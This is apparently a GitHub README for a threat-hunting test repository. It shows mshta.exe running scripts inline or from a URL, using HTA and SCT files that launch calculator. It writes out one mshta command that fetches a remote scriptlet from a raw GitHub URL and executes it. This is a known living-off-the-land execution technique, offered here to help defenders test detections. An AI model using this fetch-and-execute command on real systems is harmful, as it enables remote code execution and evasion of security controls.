# TestThreatHunting
Using mshta.exe to preform scripts inline or from a URL

Test the following:
* mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/PS1.sct')).Exec();close();
  - The will run a script from a URL to run calculator.
- Save the content of the file **MaliciousHTA.hta** locally and double click it to run a calculator
- 

# Files
<h3>What is SCT file extension</h3>

Component Object Model (COM) is a software component of windows as they store the scripts of software products installed on the user machine. This script includes (VBScript, JavaScript, or JScript, etc.), this unmanaged codes are stored in .SCT format.

<h3>What is HTA file extension</h3>

HTML Application (HTA) files have the file extension hta.HTA's are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

<h3>List of files</h3>

- Hello.sct:
  - This files contains a HTML code saved in SCT file that will run a calculator
- MaliciousHTA.hta:
  - This files contains a HTML code saved in HTA file that will run a calculator
- PS1.sct:
  - Contains a XML code with JScript that will run calculator
- 
